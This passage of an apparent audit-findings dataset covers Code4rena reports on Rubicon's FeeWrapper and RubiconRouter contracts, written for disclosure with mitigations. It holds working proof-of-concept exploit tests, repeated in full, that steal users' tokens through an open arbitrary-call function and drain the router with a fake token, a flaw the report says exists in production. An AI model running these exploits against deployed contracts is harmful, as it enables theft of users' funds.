loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { parseUnits } from \"ethers/lib/utils\";\nimport { ethers } from \"hardhat\";\nconst { expect } = require(\"chai\");\n\ndescribe(\"Fee Wrapper\", function () {\n  const FEE_TO = \"0x0000000000000000000000000000000000000FEE\";\n\n  async function deployRubiProtocolFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, otherAccount, testMaker, attacker, victim] = await ethers.getSigners();\n\n    const WETH = await ethers.getContractFactory(\"WETH9\");\n    const weth = await WETH.deploy();\n\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const interestRateModelFacStory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n    const name = \"Test Bath Token\"; // TODO: move this process to Bath House factory\n    const symbol = \"bathTEST\";\n    const decimal = 18;\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    const cTokenDelegatorFactory = await ethers.getContractFactory(\n      \"CErc20Delegator\"\n    );\n\n    const cWETH = await cTokenDelegatorFactory\n      .deploy(\n        weth.address,\n        comptroller.address,\n        interestRateModel,\n        initialExchangeRateMantissa,\n        \"WETH\",\n        \"WETH\",\n        decimal,\n        owner.address, // Admin!\n        cTokenImplementation.address,\n        becomeImplementationData\n      )\n      .catch((e) => {\n        console.log(\"\\nError deploying cWETH!\", e.reason, \"\\n\");\n      });\n    await comptroller._supportMarket(cWETH!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    const RubiconMarketFactory = await ethers.getContractFactory(\n      \"RubiconMarket\"\n    );\n    const rubiconMarket = await RubiconMarketFactory.deploy();\n    await rubiconMarket.initialize(testMaker.address);\n    await rubiconMarket.setFeeBPS(10);\n\n    // Make a liquid ERC-20 pair for testCoin and testStableCoin. Bid at $90 ask at $110.\n    await testCoin.connect(owner).faucet();\n    await testStableCoin.connect(owner).faucet();\n\n    await testCoin.connect(owner).transfer(victim.address, parseUnits(\"999\"));\n\n    await testCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n    await testStableCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"90\", 6),\n      testStableCoin.address,\n      parseUnits(\"100\"),\n      testCoin.address,\n      { from: owner.address }\n    );\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"100\"),\n      testCoin.address,\n      parseUnits(\"110\", 6),\n      testStableCoin.address,\n      { from: owner.address }\n    );\n\n    const RubiconRouter = await ethers.getContractFactory(\"RubiconRouter\");\n    const router = await RubiconRouter.deploy();\n    await router.startErUp(rubiconMarket.address, weth.address);\n\n    // fee wrapper\n    const FeeWrapper = await ethers.getContractFactory(\"FeeWrapper\");\n    const feeWrapper = await FeeWrapper.deploy();\n\n    // 3rd party protocol\n    const PepeFinance = await ethers.getContractFactory(\"Some3rdPartyProtocol\");\n    const pepeFinance = await PepeFinance.deploy(\n      feeWrapper.address,\n      FEE_TO,\n      rubiconMarket.address\n    );\n\n    await testCoin!.connect(owner).approve(router.address, parseUnits(\"320\"));\n\n    return {\n      rubiconMarket,\n      testCoin,\n      owner,\n      otherAccount,\n      testStableCoin,\n      weth,\n      cWETH,\n      router,\n      feeWrapper,\n      pepeFinance,\n      attacker,\n      victim\n    };\n  }\n  it(\"Exploit steal all tokens from offers created with the `FeeWrapper`\", async function () {\n    const { testCoin, testStableCoin, pepeFinance, rubiconMarket, feeWrapper, attacker, victim } = await loadFixture(\n      deployRubiProtocolFixture\n    );\n\n    let victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim has a lot of tokens. Victim's balance = \", victimBalance)\n\n    // Victim puts all his hard-earned money into an offer\n    let pay_amt = testCoin.balanceOf(victim.address);\n    await testCoin\n      .connect(victim)\n      .approve(pepeFinance.address, pay_amt);\n    await pepeFinance.connect(victim).executeOffer(\n      pay_amt,\n      testCoin.address,\n      parseUnits(\"110\"),\n      testStableCoin.address,\n      0\n    );\n    // This is the 3rd offer, hence it would get and ID of 3\n    const victimOfferId = 3;\n\n    let attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"Before attack attacker has no tokens. Attacker's balance = \", attackerBalance)\n\n\n    let ABI = [\n      \"function cancel(uint256 id)\",\n      \"function transfer(address to, uint256 amount)\"\n    ];\n    let iface = new ethers.utils.Interface(ABI);\n\n    // The attaacker calls `cancel` through the `FeeWrapper`.\n    // This steals the victim's tokens and puts them into the FeeWrapper\n    let cancelFunc = iface.getFunction(\"cancel\")\n    let cancelFuncSig = iface.getSighash(cancelFunc)\n    let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [victimOfferId])\n    await feeWrapper.rubicall(\n      {\n        selector: cancelFuncSig,\n        args: cancelFuncParams,\n        target: rubiconMarket.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: parseUnits(\"0\"),\n          feeAmount: parseUnits(\"0\"),\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    // The attacker calls `transfer` to take the victim's tokens from the FeeWrapper, to the attacker account\n    let feeWrapperBalance = await testCoin.balanceOf(feeWrapper.address)\n    let transferFunc = iface.getFunction(\"transfer\")\n    let transferFuncSig = iface.getSighash(transferFunc)\n    let transferFuncParams = iface._encodeParams(transferFunc.inputs, [attacker.address, feeWrapperBalance])\n    await feeWrapper.rubicall(\n      {\n        selector: transferFuncSig,\n        args: transferFuncParams,\n        target: testCoin.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: 0,\n          feeAmount: 0,\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"After attack, attacker has all of the victims tokens. Attacker's balance = \", attackerBalance)\n    victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim is left with nothing. Victim's balance = \", victimBalance)\n\n    // Assert that we really stole all victim's tokens\n    expect(attackerBalance).to.be.gt(0);\n    expect(victimBalance).to.equal(0);\n  })\n});\n```\n\nAnd we created `Some3rdPartyProtocol.sol`, which is almost identical to `Test3rdPartyProtocol.sol`, but uses `RubiconMarket` directly.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"../RubiconMarket.sol\";\nimport \"../utilities/FeeWrapper.sol\";\n\ncontract Some3rdPartyProtocol {\n    address public feeWrapper;\n    uint256 feeType = 10_000; // BPS\n    uint256 fee = 10; // 10/10_000\n    address feeTo;\n    address rubiMarket;\n\n    constructor(address _feeWrapper, address _feeTo, address _rubiMarket) {\n        feeWrapper = _feeWrapper;\n        feeTo = _feeTo;\n        rubiMarket = _rubiMarket;\n    }\n\n    function executeOffer(\n        uint256 pay_amt,\n        address pay_gem,\n        uint256 buy_amt,\n        address buy_gem,\n        uint256 pos\n    ) external returns (uint256) {\n        uint256[] memory tokenAmounts = new uint256[](2);\n        bytes memory id;\n        tokenAmounts[0] = pay_amt;\n    tokenAmounts[1] = buy_amt;\n\n        IERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n        IERC20(pay_gem).approve(address(feeWrapper), pay_amt);\n\n        // calculate fee to pay using FeeWrapper\n        (uint256[] memory new_amounts, uint256[] memory fees_) = FeeWrapper(\n            feeWrapper\n        ).calculateFee(tokenAmounts, feeType, fee);\n\n        FeeWrapper.FeeParams memory feeParams = FeeWrapper.FeeParams(\n            pay_gem,\n            pay_amt,\n            fees_[0],\n            feeTo\n        );\n\n        // update both pay_amt and buy_amt_min with fee deducted\n        pay_amt = new_amounts[0];\n\n        // Call rubiMarket.offer\n        FeeWrapper.CallParams memory params = FeeWrapper.CallParams(\n            bytes4(keccak256(bytes(\"offer(uint256,address,uint256,address)\"))),\n            abi.encode(pay_amt, pay_gem, buy_amt, buy_gem),\n            rubiMarket,\n            feeParams\n        );\n        id = FeeWrapper(feeWrapper).rubicall(params);\n\n        return uint256(bytes32(id));\n    }\n}\n```\n\nIf you run the test, you'll see the following output\n\n```\n$ npx hardhat test test/hardhat-tests/exploit-fee-wrapper.ts\n\nThe victim has a lot of tokens. Victim's balance =  `999000000000000000000`\nBefore attack attacker has no tokens. Attacker's balance =  `0`\nAfter attack, attacker has all of the victims tokens. Attacker's balance =  `998001000000000000000`\nThe victim is left with nothing. Victim's balance =  `0`\n```\n\n### Exploit 2 - 3rd party calls `RubiconRouter` through the `FeeWrapper`\n\nTo emphasize the problem, we'll also show that there's a problem in the example given with `Test3rdPartyProtocol.sol` as\nwell. There's another bug making it impossible to cancel offers through the `FeeWrapper`, because the `FeeWrapper` is\nnot capable of accepting `eth`.\n\n\nThe following test is an exploit using the given `Test3rdPartyProtocol.sol` which cancels an offer made by another user. Currently, user cancel doesn't work because `FeeWrapper` doesn't have a payable fallback function. This exploit will work when the payable function is added, resulting in stolen funds.\n\nJust to be clear, currently, an honest user making an offer can't cancel his own offer.\n\nWe added the following test to `fee-wrapper.ts` that shows this exploit:\n\n\n```solidity\nit(\"should call offerWithETH via 3d party AND STEAL IT ALL!\", async function () {\n  const { testCoin, pepeFinance, feeWrapper, router } = await loadFixture(\n    deployRubiProtocolFixture\n  );\n\n  const feeToETHBalance0 = await ethers.provider.getBalance(FEE_TO);\n  await pepeFinance.executeOfferWithETH(\n    parseUnits(\"9\"),\n    parseUnits(\"310\"),\n    testCoin.address,\n    0,\n    { value: parseUnits(\"9\") }\n  );\n  const feeToETHBalance1 = await ethers.provider.getBalance(FEE_TO);\n  expect(feeToETHBalance1).to.be.gt(feeToETHBalance0);\n\n  // The attacker calls the `FeeWrapper` directly\n  let ABI = [\n    \"function cancelForETH(uint256 id)\"\n  ];\n  let iface = new ethers.utils.Interface(ABI);\n  let cancelFunc = iface.getFunction(\"cancelForETH\")\n  let cancelFuncSig = iface.getSighash(cancelFunc)\n  let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [5])\n  console.log(await feeWrapper.rubicall(\n    {\n      selector: cancelFuncSig,\n      args: cancelFuncParams,\n      target: router.address,\n      feeParams: {\n        feeToken: testCoin.address,\n        totalAmount: 0,\n        feeAmount: 0,\n        feeTo: testCoin.address\n      }\n    }\n  ))\n});\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n**container:**\n# Vulnerability details\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L60-L73\n\n\n# Vulnerability details\n\n## Impact\n\nAn attacker can steal all tokens of users that use `FeeWrapper`.\n\n## Proof of Concept\n\nThere is no way to distinguish between users that use `FeeWrapper`. For example, if a user called `RubiconRouter`\nthrough the `FeeWrapper`, then the `msg.sender` in `RubiconRouter` would be the address of `FeeWrapper`, instead\nof the address of the user. This will cause all offers to be owned by `FeeWrapper`.\n\nThis means that a malicious attacker can call `FeeWrapper` and impersonate another user, then withdraw his tokens\non his behalf. Here is an example of the flow of events that could occur:\n\n1. A victim sends his token to some 3rd party that uses the `FeeWrapper` to call `Rubicon` contracts\n    - The 3rd party creates an offer through the `FeeWrapper`.\n2. A malicious attacker calls the `FeeWrapper` directly, and cancels the offer the victim created. The tokens are returned to the `FeeWrapper`.\n3. The attacker calls the `FeeWrapper` again, this time calling `transfer`, to transfer all the tokens from the `FeeWrapper` into the attacker's account.\n\n\nAs seen in the `FeeWrapper`, it's possible for anyone to make the `FeeWrapper` call any function of any contract with any arguments, through [rubicall](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/FeeWrapper.sol#L66). So, for example, we can call `offer` and `cancel` (of `RubiconMarket`) and even `transfer`/`transferFrom` (of any ERC20 token) on its behalf.\n\n\n### Exploit 1 - 3rd party calls `RubiconMarket` through the `FeeWrapper`\n\nThis exploit has a victim and an attacker, the victim invests his tokens through some 3rd party that uses the `FeeWrapper`\nby creating an offer. Then the attacker calls the `FeeWrapper` directly, and cancels the victim's offer, taking all his\ntokens.\n\nWe modified the `fee-wrapper.ts` test. The setup is almost identical, only we added a `victim` and an `attacker`, and\nmodified the `pepeFinance` to use our example 3rd party.\n\n```typescript\nimport { loadFixture } from \"@nomicfoundation/hardhat-network-helpers\";\nimport { parseUnits } from \"ethers/lib/utils\";\nimport { ethers } from \"hardhat\";\nconst { expect } = require(\"chai\");\n\ndescribe(\"Fee Wrapper\", function () {\n  const FEE_TO = \"0x0000000000000000000000000000000000000FEE\";\n\n  async function deployRubiProtocolFixture() {\n    // Contracts are deployed using the first signer/account by default\n    const [owner, otherAccount, testMaker, attacker, victim] = await ethers.getSigners();\n\n    const WETH = await ethers.getContractFactory(\"WETH9\");\n    const weth = await WETH.deploy();\n\n    const testCoinFactory = await ethers.getContractFactory(\"TokenWithFaucet\");\n    const testCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test\",\n      \"TEST\",\n      18\n    );\n    const testStableCoin = await testCoinFactory.deploy(\n      owner.address,\n      \"Test Stablecoin\",\n      \"TUSDC\",\n      6\n    );\n\n    const ComptrollerFactory = await ethers.getContractFactory(\"Comptroller\");\n    const comptroller = await ComptrollerFactory.deploy(); // TODO: Rename to bath house?\n\n    const interestRateModelFacStory = await ethers.getContractFactory(\n      \"WhitePaperInterestRateModel\"\n    );\n\n    // Inputs\n    const baseRatePerYear = parseUnits(\"0.3\"); //  TODO: WHAT SHOULD THIS BE?\n    const multiplierPerYear = parseUnits(\"0.02\"); //  TODO: WHAT SHOULD THIS BE?\n    const irModel = await interestRateModelFactory.deploy(\n      baseRatePerYear,\n      multiplierPerYear\n    );\n\n    const cTokenFactory = await ethers.getContractFactory(\"CErc20Delegate\");\n    const cTokenImplementation = await cTokenFactory.deploy();\n\n    // Initialize the market\n    const underlying = testCoin.address;\n    const interestRateModel = irModel.address;\n    const initialExchangeRateMantissa = \"200000000000000000000000000\"; // TODO: What should this be?\n    const name = \"Test Bath Token\"; // TODO: move this process to Bath House factory\n    const symbol = \"bathTEST\";\n    const decimal = 18;\n\n    const becomeImplementationData = \"0x\"; //TODO: What should this be?\n\n    const cTokenDelegatorFactory = await ethers.getContractFactory(\n      \"CErc20Delegator\"\n    );\n\n    const cWETH = await cTokenDelegatorFactory\n      .deploy(\n        weth.address,\n        comptroller.address,\n        interestRateModel,\n        initialExchangeRateMantissa,\n        \"WETH\",\n        \"WETH\",\n        decimal,\n        owner.address, // Admin!\n        cTokenImplementation.address,\n        becomeImplementationData\n      )\n      .catch((e) => {\n        console.log(\"\\nError deploying cWETH!\", e.reason, \"\\n\");\n      });\n    await comptroller._supportMarket(cWETH!.address).catch((e: any) => {\n      console.log(\"\\nError supporting new cToken market!\", e.reason, \"\\n\");\n    });\n\n    const RubiconMarketFactory = await ethers.getContractFactory(\n      \"RubiconMarket\"\n    );\n    const rubiconMarket = await RubiconMarketFactory.deploy();\n    await rubiconMarket.initialize(testMaker.address);\n    await rubiconMarket.setFeeBPS(10);\n\n    // Make a liquid ERC-20 pair for testCoin and testStableCoin. Bid at $90 ask at $110.\n    await testCoin.connect(owner).faucet();\n    await testStableCoin.connect(owner).faucet();\n\n    await testCoin.connect(owner).transfer(victim.address, parseUnits(\"999\"));\n\n    await testCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n    await testStableCoin!\n      .connect(owner)\n      .approve(rubiconMarket.address, parseUnits(\"1000\"));\n\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"90\", 6),\n      testStableCoin.address,\n      parseUnits(\"100\"),\n      testCoin.address,\n      { from: owner.address }\n    );\n    await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n      parseUnits(\"100\"),\n      testCoin.address,\n      parseUnits(\"110\", 6),\n      testStableCoin.address,\n      { from: owner.address }\n    );\n\n    const RubiconRouter = await ethers.getContractFactory(\"RubiconRouter\");\n    const router = await RubiconRouter.deploy();\n    await router.startErUp(rubiconMarket.address, weth.address);\n\n    // fee wrapper\n    const FeeWrapper = await ethers.getContractFactory(\"FeeWrapper\");\n    const feeWrapper = await FeeWrapper.deploy();\n\n    // 3rd party protocol\n    const PepeFinance = await ethers.getContractFactory(\"Some3rdPartyProtocol\");\n    const pepeFinance = await PepeFinance.deploy(\n      feeWrapper.address,\n      FEE_TO,\n      rubiconMarket.address\n    );\n\n    await testCoin!.connect(owner).approve(router.address, parseUnits(\"320\"));\n\n    return {\n      rubiconMarket,\n      testCoin,\n      owner,\n      otherAccount,\n      testStableCoin,\n      weth,\n      cWETH,\n      router,\n      feeWrapper,\n      pepeFinance,\n      attacker,\n      victim\n    };\n  }\n  it(\"Exploit steal all tokens from offers created with the `FeeWrapper`\", async function () {\n    const { testCoin, testStableCoin, pepeFinance, rubiconMarket, feeWrapper, attacker, victim } = await loadFixture(\n      deployRubiProtocolFixture\n    );\n\n    let victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim has a lot of tokens. Victim's balance = \", victimBalance)\n\n    // Victim puts all his hard-earned money into an offer\n    let pay_amt = testCoin.balanceOf(victim.address);\n    await testCoin\n      .connect(victim)\n      .approve(pepeFinance.address, pay_amt);\n    await pepeFinance.connect(victim).executeOffer(\n      pay_amt,\n      testCoin.address,\n      parseUnits(\"110\"),\n      testStableCoin.address,\n      0\n    );\n    // This is the 3rd offer, hence it would get and ID of 3\n    const victimOfferId = 3;\n\n    let attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"Before attack attacker has no tokens. Attacker's balance = \", attackerBalance)\n\n\n    let ABI = [\n      \"function cancel(uint256 id)\",\n      \"function transfer(address to, uint256 amount)\"\n    ];\n    let iface = new ethers.utils.Interface(ABI);\n\n    // The attaacker calls `cancel` through the `FeeWrapper`.\n    // This steals the victim's tokens and puts them into the FeeWrapper\n    let cancelFunc = iface.getFunction(\"cancel\")\n    let cancelFuncSig = iface.getSighash(cancelFunc)\n    let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [victimOfferId])\n    await feeWrapper.rubicall(\n      {\n        selector: cancelFuncSig,\n        args: cancelFuncParams,\n        target: rubiconMarket.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: parseUnits(\"0\"),\n          feeAmount: parseUnits(\"0\"),\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    // The attacker calls `transfer` to take the victim's tokens from the FeeWrapper, to the attacker account\n    let feeWrapperBalance = await testCoin.balanceOf(feeWrapper.address)\n    let transferFunc = iface.getFunction(\"transfer\")\n    let transferFuncSig = iface.getSighash(transferFunc)\n    let transferFuncParams = iface._encodeParams(transferFunc.inputs, [attacker.address, feeWrapperBalance])\n    await feeWrapper.rubicall(\n      {\n        selector: transferFuncSig,\n        args: transferFuncParams,\n        target: testCoin.address,\n        feeParams: {\n          feeToken: testCoin.address,\n          totalAmount: 0,\n          feeAmount: 0,\n          feeTo: testCoin.address\n        }\n      }\n    )\n\n    attackerBalance = Number(await testCoin.balanceOf(attacker.address))\n    console.log(\"After attack, attacker has all of the victims tokens. Attacker's balance = \", attackerBalance)\n    victimBalance = Number(await testCoin.balanceOf(victim.address))\n    console.log(\"The victim is left with nothing. Victim's balance = \", victimBalance)\n\n    // Assert that we really stole all victim's tokens\n    expect(attackerBalance).to.be.gt(0);\n    expect(victimBalance).to.equal(0);\n  })\n});\n```\n\nAnd we created `Some3rdPartyProtocol.sol`, which is almost identical to `Test3rdPartyProtocol.sol`, but uses `RubiconMarket` directly.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"../RubiconMarket.sol\";\nimport \"../utilities/FeeWrapper.sol\";\n\ncontract Some3rdPartyProtocol {\n    address public feeWrapper;\n    uint256 feeType = 10_000; // BPS\n    uint256 fee = 10; // 10/10_000\n    address feeTo;\n    address rubiMarket;\n\n    constructor(address _feeWrapper, address _feeTo, address _rubiMarket) {\n        feeWrapper = _feeWrapper;\n        feeTo = _feeTo;\n        rubiMarket = _rubiMarket;\n    }\n\n    function executeOffer(\n        uint256 pay_amt,\n        address pay_gem,\n        uint256 buy_amt,\n        address buy_gem,\n        uint256 pos\n    ) external returns (uint256) {\n        uint256[] memory tokenAmounts = new uint256[](2);\n        bytes memory id;\n        tokenAmounts[0] = pay_amt;\n    tokenAmounts[1] = buy_amt;\n\n        IERC20(pay_gem).transferFrom(msg.sender, address(this), pay_amt);\n        IERC20(pay_gem).approve(address(feeWrapper), pay_amt);\n\n        // calculate fee to pay using FeeWrapper\n        (uint256[] memory new_amounts, uint256[] memory fees_) = FeeWrapper(\n            feeWrapper\n        ).calculateFee(tokenAmounts, feeType, fee);\n\n        FeeWrapper.FeeParams memory feeParams = FeeWrapper.FeeParams(\n            pay_gem,\n            pay_amt,\n            fees_[0],\n            feeTo\n        );\n\n        // update both pay_amt and buy_amt_min with fee deducted\n        pay_amt = new_amounts[0];\n\n        // Call rubiMarket.offer\n        FeeWrapper.CallParams memory params = FeeWrapper.CallParams(\n            bytes4(keccak256(bytes(\"offer(uint256,address,uint256,address)\"))),\n            abi.encode(pay_amt, pay_gem, buy_amt, buy_gem),\n            rubiMarket,\n            feeParams\n        );\n        id = FeeWrapper(feeWrapper).rubicall(params);\n\n        return uint256(bytes32(id));\n    }\n}\n```\n\nIf you run the test, you'll see the following output\n\n```\n$ npx hardhat test test/hardhat-tests/exploit-fee-wrapper.ts\n\nThe victim has a lot of tokens. Victim's balance =  `999000000000000000000`\nBefore attack attacker has no tokens. Attacker's balance =  `0`\nAfter attack, attacker has all of the victims tokens. Attacker's balance =  `998001000000000000000`\nThe victim is left with nothing. Victim's balance =  `0`\n```\n\n### Exploit 2 - 3rd party calls `RubiconRouter` through the `FeeWrapper`\n\nTo emphasize the problem, we'll also show that there's a problem in the example given with `Test3rdPartyProtocol.sol` as\nwell. There's another bug making it impossible to cancel offers through the `FeeWrapper`, because the `FeeWrapper` is\nnot capable of accepting `eth`.\n\n\nThe following test is an exploit using the given `Test3rdPartyProtocol.sol` which cancels an offer made by another user. Currently, user cancel doesn't work because `FeeWrapper` doesn't have a payable fallback function. This exploit will work when the payable function is added, resulting in stolen funds.\n\nJust to be clear, currently, an honest user making an offer can't cancel his own offer.\n\nWe added the following test to `fee-wrapper.ts` that shows this exploit:\n\n\n```solidity\nit(\"should call offerWithETH via 3d party AND STEAL IT ALL!\", async function () {\n  const { testCoin, pepeFinance, feeWrapper, router } = await loadFixture(\n    deployRubiProtocolFixture\n  );\n\n  const feeToETHBalance0 = await ethers.provider.getBalance(FEE_TO);\n  await pepeFinance.executeOfferWithETH(\n    parseUnits(\"9\"),\n    parseUnits(\"310\"),\n    testCoin.address,\n    0,\n    { value: parseUnits(\"9\") }\n  );\n  const feeToETHBalance1 = await ethers.provider.getBalance(FEE_TO);\n  expect(feeToETHBalance1).to.be.gt(feeToETHBalance0);\n\n  // The attacker calls the `FeeWrapper` directly\n  let ABI = [\n    \"function cancelForETH(uint256 id)\"\n  ];\n  let iface = new ethers.utils.Interface(ABI);\n  let cancelFunc = iface.getFunction(\"cancelForETH\")\n  let cancelFuncSig = iface.getSighash(cancelFunc)\n  let cancelFuncParams = iface._encodeParams(cancelFunc.inputs, [5])\n  console.log(await feeWrapper.rubicall(\n    {\n      selector: cancelFuncSig,\n      args: cancelFuncParams,\n      target: router.address,\n      feeParams: {\n        feeToken: testCoin.address,\n        totalAmount: 0,\n        feeAmount: 0,\n        feeTo: testCoin.address\n      }\n    }\n  ))\n});\n```\n\n## Recommended Mitigation Steps\n\nWe recommend converting the `FeeWrapper` to be a library, instead of a standalone contract (i.e. it shouldn't have an address) and making the `rubicall` function private. That way all the logic of the `FeeWrapper` can be used by 3rd parties, but no one can call the `FeeWrapper` directly.\n\nAlso, we think `FeeWrapper` functions should have a reentry guard.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 770,
      "page_start": null,
      "heading": "770. An attacker can steal all `RubiconRouter` funds",
      "heading_cleaned": "An attacker can steal all `RubiconRouter` funds",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374\n\n\n# Vulnerability details\n\n## Impact\n\nAn attacker can steal all funds in `RubiconRouter` by abusing an error in the token to repay the user in the functions `maxBuyAllAmount` and `maxSellAllAmount` (and possibly others).\n\nPlease note that the vulnerability exists in [the version of `RubiconRouter` in production](https://optimistic.etherscan.io/address/0x7af14adc8aea70f063c7ea3b2c1ad0d7a59c4bff) and was in fact missed in the C4 contest for Rubicon v1.\n\n## Proof of Concept\n\nThe function `maxBuyAllAmount` is used to allow a user to trade using his entire balance of `buy_gem`. The user [transfers the funds to the router](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L348) and then `RubiconMarket` is used to find the best offers and execute them. After the trades are performed, the router intends to forward the resulting amount back to the user. Due to a bug, the token used for this transfer is `buy_gem` again, *instead* of `pay_gem` as seen [in the same function](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355).\n\nThis mismatch allows an attacker to steal all funds stored in the router using the following steps:\n\n1. Create a fake token (which only the attacker can mint).\n2. Call `approveAssetOnMarket` with the fake token indirectly. This can be done by trading with ETH and the fake token (e.g. by using `offerWithETH` and `buyAllAmountForETH`). Without this step, all calls to `maxBuyAllAmount` will fail because it doesn't approve new tokens - We suspect this is partly the reason this was missed by the test and wasn't used in production.\n3. Offer a small amount of a real token (e.g. USDC) for a large amount of the fake token.\n4. Transfer the fake token to the router so it can buy the offer.\n5. Buy the offer using `maxBuyAllAmount` and receive the funds in the real token (e.g. USDC) instead of the fake token.\n\nAttached is a POC which performs this flow.\n\n### Exploit\n\nFor this POC, please include the following lines in `ProtocolDeployment.t.sol`:\n```solidity\nimport \"../../contracts/utilities/RubiconRouter.sol\";\nimport \"forge-std/StdUtils.sol\";\n```\nThe exploit is performed by the following function:\n```solidity\n  function test_WithRouter() public {\n    RubiconRouter router = new RubiconRouter();\n    router.startErUp(address(market), payable(address(WETH)));\n\n    address attacker = 0x000000000000000000000000000000000000dACa;\n    uint256 routerBalance = 1e10;\n    deal(address(TUSDC), address(router), routerBalance); // Set this to simulate current router balance\n    deal(address(TUSDC), attacker, 1+1);\n    vm.deal(attacker, 1 ether);\n\n    vm.startPrank(attacker);\n\n    // create fake coin which only attacker can mint\n    TokenWithFaucet FAKE = new TokenWithFaucet(attacker, \"Fake\", \"FAKE\", 18);\n    FAKE.adminMint();\n\n    FAKE.approve(address(market), type(uint256).max);\n    TUSDC.approve(address(market), type(uint256).max);\n    FAKE.approve(address(router), type(uint256).max);\n    TUSDC.approve(address(router), type(uint256).max);\n\n    // Create approval for fake coin (otherwise market will not be able to transfer fake coins from router)\n    router.offerWithETH{value: 1}(1 /* ETH */, 1, FAKE, 0, attacker);\n    router.buyAllAmountForETH(1, FAKE, 1);\n\n    // Assume TEST is a fake token only attacker can mint\n    uint256 fees = (routerBalance * (market.getFeeBPS() + market.makerFee())) / 100_000;\n    market.offer(1, TUSDC, routerBalance, FAKE, 0, attacker, attacker); // offer 1 usdc for a lot of fake coin\n\n    assertEq(TUSDC.balanceOf(attacker), 1);\n\n    FAKE.transfer(address(router), routerBalance + fees); // give router fake coins so it can buy the offer\n    router.maxBuyAllAmount(TUSDC, FAKE, type(uint256).max); // pay 1 usdc for a lot of usdc instead of fake coin (because of the vulnerability)\n\n    assertGt(TUSDC.balanceOf(attacker), 1);\n    console.log(TUSDC.balanceOf(attacker));\n  }\n```\n\nThe output of this test shows that funds were stolen from the router:\n```shell\nRunning 1 test for test/foundry-tests/ProtocolDeployment.t.sol:ProtocolDeploymentTest\n[PASS] test_WithRouter() (gas: 5216320)\nLogs:\n  9999000000\n\nTest result: ok. 1 passed; 0 failed; finished in 20.86ms\n```\n\n## Recommended Mitigation Steps\n\nThe final transfers in `maxBuyAllAmount` and `maxSellAllAmount` (see [RubiconRouter.sol#L355](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L355) and [RubiconRouter.sol#L374](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/RubiconRouter.sol#L374)) should use `pay_gem` instead of `buy_gem`.\n",
